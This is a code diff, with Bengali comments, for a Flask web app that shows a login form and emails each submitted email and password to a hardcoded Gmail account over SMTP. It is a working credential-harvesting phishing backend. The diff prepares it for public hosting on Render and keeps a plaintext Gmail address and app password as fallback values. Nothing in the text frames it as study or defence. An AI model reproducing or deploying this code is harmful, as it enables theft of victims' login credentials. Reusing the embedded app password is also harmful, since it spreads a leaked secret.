@@ -1,23 +1,30 @@
 import os
 import smtplib
-from flask import Flask, render_template, request, redirect
+from flask import Flask, render_template, request, redirect, url_for
 from dotenv import load_dotenv
 
-# .env ফাইল থেকে ভেরিয়েবল লোড করার জন্য (নিরাপত্তার জন্য)
+# .env ফাইল থেকে ভেরিয়েবল লোড করার জন্য
 load_dotenv()
 
 app = Flask(__name__)
 
 def send_email(user_info):
     try:
+        # Render Environment Variables থেকে ডাটা নেওয়া
+        # এখানে সরাসরি পাসওয়ার্ড না লিখে ভেরিয়েবল ব্যবহার করাই সবচেয়ে নিরাপদ
+        my_email = os.environ.get("MY_EMAIL")
+        app_password = os.environ.get("APP_PASSWORD")
+
+        # যদি Render-এ সেট করা না থাকে তবে আপনার দেওয়া ডিফল্টগুলো কাজ করবে
+        if not my_email:
+            my_email = "mdrakibjoysiddhi2025@gmail.com"
+        if not app_password:
+            app_password = "jloa wdtm rdfr hnma"
+
         # Gmail SMTP সার্ভার সেটআপ
         server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.set_debuglevel(1) # লগ দেখার জন্য
         server.starttls()
-        
-        # Render বা স্থানীয় এনভায়রনমেন্ট থেকে ডাটা নেওয়া
-        # যদি .env ব্যবহার না করেন তবে সরাসরি আপনার ইমেইল ও পাসওয়ার্ড এখানে দিতে পারেন
-        my_email = os.environ.get("MY_EMAIL", "mdrakibjoysiddhi2025@gmail.com")
-        app_password = os.environ.get("APP_PASSWORD", "jloa wdtm rdfr hnma")
         
         server.login(my_email, app_password)
         
@@ -30,7 +37,7 @@ def send_email(user_info):
         server.quit()  
         return True
     except Exception as e:
-        print(f"Error: {e}") 
+        print(f"SMTP Error: {e}") 
         return False
 
 @app.route('/') 
@@ -43,20 +50,22 @@ def login():
     password = request.form.get('password')
 
     if not email or not password:
-        return redirect('/')
+        return redirect(url_for('index'))
     
     user_data = f"Email: {email}\nPassword: {password}"
     email_sent = send_email(user_data)
     
     if email_sent:
-        return redirect('/success')
+        return redirect(url_for('success'))
     else:
-        return "ইমেইল পাঠাতে সমস্যা হয়েছে। অনুগ্রহ করে পরে চেষ্টা করুন।"
+        # এরর মেসেজ আরও পরিষ্কার করা হয়েছে
+        return "সার্ভারে সমস্যা হয়েছে। অনুগ্রহ করে নিশ্চিত করুন Render-এ Environment Variables সেট করা আছে।"
 
 @app.route('/success')
 def success():
     return render_template('success.html')
 
 if __name__ == '__main__':
-    # হোস্ট করার সময় 'debug=True' রাখা উচিত নয়, তবে লোকাল চেক করার জন্য ঠিক আছে
-    app.run(debug=True)
+    # প্রোডাকশনে পোর্ট ডায়নামিক হওয়া প্রয়োজন
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
